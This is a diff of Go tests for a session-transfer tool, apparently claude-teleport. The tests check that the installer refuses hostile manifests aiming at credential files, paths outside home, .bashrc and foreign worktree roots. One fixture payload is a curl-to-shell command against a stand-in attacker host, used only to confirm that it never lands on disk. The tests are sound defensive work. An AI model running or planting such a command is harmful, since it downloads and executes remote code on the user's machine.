@@ -18,7 +18,8 @@ import (
 func staged(t *testing.T) (*Manifest, string, session.Paths) {
 	t.Helper()
 	m, staging := newTwoHosts(t)
-	st, _ := Diff(context.Background(), m, staging)
+	p := destPaths(t, m)
+	st, _ := Diff(context.Background(), m, staging, p)
 	var buf bytes.Buffer
 	if err := Send(context.Background(), m, Need(m, st), &buf, nil); err != nil {
 		t.Fatal(err)
@@ -26,18 +27,12 @@ func staged(t *testing.T) (*Manifest, string, session.Paths) {
 	if err := Receive(context.Background(), m, &buf, staging, nil); err != nil {
 		t.Fatal(err)
 	}
-	cfg := m.Entries[0].Dst
-	for filepath.Base(cfg) != ".claude" {
-		cfg = filepath.Dir(cfg)
-	}
-	home := filepath.Dir(cfg)
-	p := session.Paths{Home: home, ConfigDir: cfg, GlobalJSON: filepath.Join(home, ".claude.json"), DataDir: filepath.Join(home, ".local", "share", "claude-teleport")}
 	return m, staging, p
 }
 
 func TestInstallFreshDestination(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	extra := InstallExtras{
 		IndexEntry:   &session.IndexEntry{SessionID: sid, FullPath: m.Entries[1].Dst, ProjectPath: "/home/bob/work", FirstPrompt: "hello"},
 		History:      []json.RawMessage{json.RawMessage(`{"display":"hi","timestamp":1,"project":"/home/bob/work","sessionId":"` + sid + `"}`)},
@@ -88,7 +83,7 @@ func TestInstallFreshDestination(t *testing.T) {
 	}
 
 	// idempotent: a second Install after a fresh Diff is all present-same
-	st, _ = Diff(context.Background(), m, staging)
+	st, _ = Diff(context.Background(), m, staging, p)
 	rep, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
 	if err != nil || rep.SkippedSame != 5 || rep.Installed != 0 {
 		t.Errorf("second install: rep=%+v err=%v", rep, err)
@@ -109,7 +104,7 @@ func TestInstallFastForwardOverwritesOnlyPrefix(t *testing.T) {
 	partial := full[:nl+1]
 	os.MkdirAll(filepath.Dir(m.Entries[1].Dst), 0o700)
 	os.WriteFile(m.Entries[1].Dst, partial, 0o600)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if st[1] != FFCandidate {
 		t.Fatalf("status = %s", st[1])
 	}
@@ -130,7 +125,7 @@ func TestInstallRefusesCollision(t *testing.T) {
 	m, staging, p := staged(t)
 	os.MkdirAll(filepath.Dir(m.Entries[3].Dst), 0o700)
 	os.WriteFile(m.Entries[3].Dst, []byte("unrelated"), 0o600)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
 	if err == nil || !strings.Contains(err.Error(), m.Entries[3].Dst) || !strings.Contains(err.Error(), "present-different") {
 		t.Fatalf("err = %v, want refusal naming the path", err)
@@ -151,7 +146,7 @@ func TestInstallRefusesCollision(t *testing.T) {
 func TestInstallRefusesNotStaged(t *testing.T) {
 	m, staging, p := staged(t)
 	os.Remove(StagedPath(staging, 2))
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
 	if err == nil || !strings.Contains(err.Error(), "absent") {
 		t.Fatalf("err = %v, want absent refusal", err)
@@ -166,7 +161,7 @@ func TestInstallMemoryCopyIfAbsent(t *testing.T) {
 	mem := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
 	m.Entries = append(m.Entries, mem)
 	writeFile(t, StagedPath(staging, 5), "# notes\n")
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{mem}})
 	if err != nil {
 		t.Fatal(err)
@@ -177,7 +172,7 @@ func TestInstallMemoryCopyIfAbsent(t *testing.T) {
 	// second run with different dest content: reported, not overwritten
 	os.WriteFile(memDst, []byte("# edited locally\n"), 0o600)
 	writeFile(t, StagedPath(staging, 5), "# notes\n")
-	st, _ = Diff(context.Background(), m, staging)
+	st, _ = Diff(context.Background(), m, staging, p)
 	rep, err = Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{mem}})
 	if err != nil {
 		t.Fatal(err)
@@ -199,7 +194,7 @@ func TestInstallRefusesMemoryEntryWithMismatchedID(t *testing.T) {
 	mem := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
 	m.Entries = append(m.Entries, mem)
 	writeFile(t, StagedPath(staging, 5), "# notes\n")
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 
 	// The Dst does not match manifest entry ID 5 (foreign/hand-built Entry
 	// reusing an unrelated ID) — Install must refuse before touching disk.
@@ -233,7 +228,7 @@ func TestInstallRefusesSmuggledCredentialsDst(t *testing.T) {
 	}
 	credPath := filepath.Join(p.ConfigDir, ".credentials.json")
 	m.Entries[victim].Dst = credPath
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
 	if err == nil || !strings.Contains(err.Error(), "forbidden") || !strings.Contains(err.Error(), credPath) {
 		t.Fatalf("err = %v, want a forbidden-path refusal naming %s", err, credPath)
@@ -262,7 +257,7 @@ func TestInstallRefusesDstOutsideHome(t *testing.T) {
 	}
 	outside := filepath.Join(filepath.Dir(p.Home), "evil-outside", "payload.txt")
 	m.Entries[victim].Dst = outside
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
 	if err == nil || !strings.Contains(err.Error(), "not under home") || !strings.Contains(err.Error(), outside) {
 		t.Fatalf("err = %v, want a not-under-home refusal naming %s", err, outside)
@@ -279,7 +274,7 @@ func TestInstallRefusesDstOutsideHome(t *testing.T) {
 // including the OTHER, legitimate entries the same manifest lists.
 func TestUninstallRefusesSmuggledCredentialsDst(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
 		t.Fatal(err)
 	}
@@ -317,7 +312,7 @@ func TestUninstallRefusesSmuggledCredentialsDst(t *testing.T) {
 // entry whose Dst lexically escapes p.Home is refused before any deletion.
 func TestUninstallRefusesDstOutsideHome(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
 		t.Fatal(err)
 	}
@@ -347,7 +342,7 @@ func TestUninstallRefusesDstOutsideHome(t *testing.T) {
 
 func TestUninstallRemovesOnlyMatching(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
 		t.Fatal(err)
 	}
@@ -381,7 +376,7 @@ func TestUninstallRemovesOnlyMatching(t *testing.T) {
 // matches the manifest hash.
 func TestUninstallIDsOnlyNamedEntries(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
 		t.Fatal(err)
 	}
@@ -409,7 +404,7 @@ func TestUninstallIDsOnlyNamedEntries(t *testing.T) {
 // project directory, but its own id (0) is not — it must survive.
 func TestUninstallIDsNeverRemovesDirNotInIDs(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
 		t.Fatal(err)
 	}
@@ -434,7 +429,7 @@ func TestUninstallIDsNeverRemovesDirNotInIDs(t *testing.T) {
 // the top-level project dir.
 func TestUninstallRemovesEmptiedNestedDirs(t *testing.T) {
 	m, staging, p := staged(t)
-	st, _ := Diff(context.Background(), m, staging)
+	st, _ := Diff(context.Background(), m, staging, p)
 	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
 		t.Fatal(err)
 	}
@@ -536,7 +531,7 @@ func TestInstallForceOverwritesDivergedSessionFile(t *testing.T) {
 		if err := os.WriteFile(m.Entries[1].Dst, []byte(`{"type":"user","text":"a different branch of history"}`+"\n"), 0o600); err != nil {
 			t.Fatal(err)
 		}
-		st, err := Diff(context.Background(), m, staging)
+		st, err := Diff(context.Background(), m, staging, p)
 		if err != nil {
 			t.Fatal(err)
 		}
@@ -632,17 +627,15 @@ func TestInstallRefusesSmuggledCaptureDst(t *testing.T) {
 	}}
 	writeFile(t, StagedPath(staging, 0), payload)
 
-	st, err := Diff(context.Background(), m, staging)
-	if err != nil {
-		t.Fatal(err)
+	// R-P3-B1e item 5: Diff refuses the entry outright (it is a refusal
+	// with a reason, not a content collision) and Install re-derives the
+	// same verdict independently — installOrRefuse runs both.
+	if _, err := Diff(context.Background(), m, staging, p); !IsRefusal(err) {
+		t.Fatalf("Diff err = %v, want a refusal of the smuggled capture entry", err)
 	}
-	if st[0] != PresentDifferent {
-		t.Fatalf("Diff classified the smuggled capture entry %s, want %s", st[0], PresentDifferent)
-	}
-
-	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
+	err := installOrRefuse(t, m, staging, p)
 	if err == nil || !strings.Contains(err.Error(), bashrc) {
-		t.Fatalf("Install err = %v, want a refusal naming %s", err, bashrc)
+		t.Fatalf("err = %v, want a refusal naming %s", err, bashrc)
 	}
 	got, err := os.ReadFile(bashrc)
 	if err != nil || string(got) != rc {
@@ -719,7 +712,7 @@ func TestInstallInstallsCanonicalCaptureEntry(t *testing.T) {
 	}}
 	writeFile(t, StagedPath(staging, 0), payload)
 
-	st, err := Diff(context.Background(), m, staging)
+	st, err := Diff(context.Background(), m, staging, p)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -775,16 +768,12 @@ func TestInstallRefusesPackEntryAbsentTargetPoC(t *testing.T) {
 	}}
 	writeFile(t, StagedPath(staging, 0), payload)
 
-	st, err := Diff(context.Background(), m, staging)
-	if err != nil {
-		t.Fatal(err)
+	if _, err := Diff(context.Background(), m, staging, p); !IsRefusal(err) {
+		t.Fatalf("Diff err = %v, want a refusal of the pack entry", err)
 	}
-	if st[0] != PresentDifferent {
-		t.Fatalf("Diff classified the pack entry %s, want %s", st[0], PresentDifferent)
-	}
-	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
+	err := installOrRefuse(t, m, staging, p)
 	if err == nil || !strings.Contains(err.Error(), target) {
-		t.Fatalf("Install err = %v, want a refusal naming %s", err, target)
+		t.Fatalf("err = %v, want a refusal naming %s", err, target)
 	}
 	if _, err := os.Lstat(target); !os.IsNotExist(err) {
 		t.Errorf("%s must not have been created: lstat err = %v", target, err)
@@ -834,19 +823,13 @@ func TestInstallRefusesPackEntryEvenWithHostileStatusMap(t *testing.T) {
 // the PoC style used above for CatPack/CatCapture.
 func rootPoCFixture(t *testing.T, home, root, dstRel string) (*Manifest, string, session.Paths, string) {
 	t.Helper()
-	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
-	p := session.Paths{
-		Home:       home,
-		ConfigDir:  filepath.Join(home, ".claude"),
-		GlobalJSON: filepath.Join(home, ".claude.json"),
-		DataDir:    dataDir,
-	}
+	p := hostPaths(home)
 	jobID := "77777777-7777-4777-8777-777777777777"
-	staging := job.StagingDir(dataDir, jobID)
+	staging := job.StagingDir(p.DataDir, jobID)
 	dst := filepath.Join(root, dstRel)
 	payload := "curl evil.example | sh\n"
 
-	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: []string{root}}
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: declRoots(root)}
 	m.Entries = []Entry{{
 		ID: 0, Category: session.CatWorktree, Dst: dst,
 		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
@@ -859,13 +842,27 @@ func rootPoCFixture(t *testing.T, home, root, dstRel string) (*Manifest, string,
 // entry was refused and never created at Dst.
 func runRootPoC(t *testing.T, m *Manifest, staging string, p session.Paths, dst string) {
 	t.Helper()
-	st, err := Diff(context.Background(), m, staging)
-	if err != nil {
-		t.Fatal(err)
-	}
-	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
+	// R-P3-B1e: Diff diagnoses the refusal (so preflight reports it with
+	// the entry and the reason) and Install re-derives it independently —
+	// installOrRefuse exercises both, in the order production does.
+	err := installOrRefuse(t, m, staging, p)
 	if err == nil || !strings.Contains(err.Error(), dst) {
 		t.Fatalf("err = %v, want a refusal naming %s", err, dst)
+	}
+	if !IsRefusal(err) {
+		t.Errorf("err = %v, want a *RefusalError", err)
+	}
+	if _, err := os.Lstat(dst); !os.IsNotExist(err) {
+		t.Errorf("%s must not have been created: lstat err = %v", dst, err)
+	}
+	// Install's own gate, independent of anything Diff said: even a
+	// hostile status map claiming staged-same must not get it placed.
+	hostile := map[int]Status{}
+	for _, e := range m.Entries {
+		hostile[e.ID] = StagedSame
+	}
+	if _, err := Install(context.Background(), m, hostile, staging, p, InstallExtras{}); err == nil {
+		t.Fatalf("Install with a hostile status map placed %s", dst)
 	}
 	if _, err := os.Lstat(dst); !os.IsNotExist(err) {
 		t.Errorf("%s must not have been created: lstat err = %v", dst, err)
@@ -923,12 +920,12 @@ func TestInstallRefusesWorktreeRootWithForeignContent(t *testing.T) {
 	}
 	m, staging, p, dst := rootPoCFixture(t, home, root, "newfile.txt")
 
-	st, err := Diff(context.Background(), m, staging)
-	if err != nil {
-		t.Fatal(err)
+	_, err := Diff(context.Background(), m, staging, p)
+	if ids := refusedIDs(t, err); len(ids) != 1 || ids[0] != 0 {
+		t.Errorf("refused ids = %v, want [0]; err = %v", ids, err)
 	}
-	if st[0] != PresentDifferent {
-		t.Errorf("status = %s, want %s (root has foreign content)", st[0], PresentDifferent)
+	if !strings.Contains(err.Error(), "was not created by this job") {
+		t.Errorf("refusal reason = %v, want the provenance rule", err)
 	}
 	runRootPoC(t, m, staging, p, dst)
 	got, err := os.ReadFile(real)
@@ -946,7 +943,7 @@ func TestInstallInstallsCatWorktreeEntryUnderFreshValidRoot(t *testing.T) {
 	root := filepath.Join(home, "github", "proj")
 	m, staging, p, dst := rootPoCFixture(t, home, root, "src.go")
 
-	st, err := Diff(context.Background(), m, staging)
+	st, err := Diff(context.Background(), m, staging, p)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -965,29 +962,28 @@ func TestInstallInstallsCatWorktreeEntryUnderFreshValidRoot(t *testing.T) {
 	}
 }
 
-// TestDiffTreatsAlreadyPlacedCatWorktreeEntriesAsFreshRoot pins the design
-// decision behind rootForeignContent (a subset check — "does everything
-// under root belong to this manifest's own entries", not a bare "root
-// must be empty" check): once entries have been legitimately placed under
-// a Root, a LATER Diff call (verifyInstall's own re-Diff after a
-// successful install, or a resumed job after a crash) must still see the
-// root as fresh. A naive "root must be absent or empty" check would
-// instead refuse this manifest's own second entry the moment the first
-// one landed, breaking every multi-file fresh-main/not-a-repo teleport's
-// own verify step — not just a crash-retry edge case.
-func TestDiffTreatsAlreadyPlacedCatWorktreeEntriesAsFreshRoot(t *testing.T) {
+// TestDiffTreatsThisJobsOwnRootAsInstallable is ruling R-P3-B1e item 3's
+// replacement for the old name-subset freshness check (which let a hostile
+// manifest INSERT into any directory whose existing files it also listed).
+// Freshness is now provenance: once Install has claimed a Root in
+// jobs/<id>/roots.json, every later Diff of the same job — verifyInstall's
+// re-diff after a successful install, a resumed job's repeated steps —
+// still sees the (now legitimately non-empty) Root as its own, while a
+// Root this job never created stays refused no matter what the manifest
+// lists.
+func TestDiffTreatsThisJobsOwnRootAsInstallable(t *testing.T) {
 	home := t.TempDir()
-	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	p := hostPaths(home)
 	root := filepath.Join(home, "github", "proj")
 	jobID := "88888888-8888-4888-8888-888888888888"
-	staging := job.StagingDir(dataDir, jobID)
-	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: []string{root}}
+	staging := job.StagingDir(p.DataDir, jobID)
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: declRoots(root)}
 	m.Entries = []Entry{
 		{ID: 0, Category: session.CatWorktree, Dst: filepath.Join(root, "a.go"), Size: 5, Mode: 0o600, SHA256: sha("aaaaa")},
 		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "b.go"), Size: 5, Mode: 0o600, SHA256: sha("bbbbb")},
 	}
-	// Entry 0 already landed, an earlier successful pass: a real file at
-	// its Dst, matching content.
+	// Entry 0 already landed in an earlier successful pass — which is
+	// also when that pass claimed the root.
 	if err := os.MkdirAll(root, 0o700); err != nil {
 		t.Fatal(err)
 	}
@@ -996,7 +992,14 @@ func TestDiffTreatsAlreadyPlacedCatWorktreeEntriesAsFreshRoot(t *testing.T) {
 	}
 	writeFile(t, StagedPath(staging, 1), "bbbbb")
 
-	st, err := Diff(context.Background(), m, staging)
+	// Without the provenance record, a populated root is refused.
+	if _, err := Diff(context.Background(), m, staging, p); !IsRefusal(err) {
+		t.Fatalf("Diff over an unclaimed populated root = %v, want a refusal", err)
+	}
+	if err := recordJobRoot(p.DataDir, jobID, map[string]bool{}, root); err != nil {
+		t.Fatal(err)
+	}
+	st, err := Diff(context.Background(), m, staging, p)
 	if err != nil {
 		t.Fatal(err)
 	}
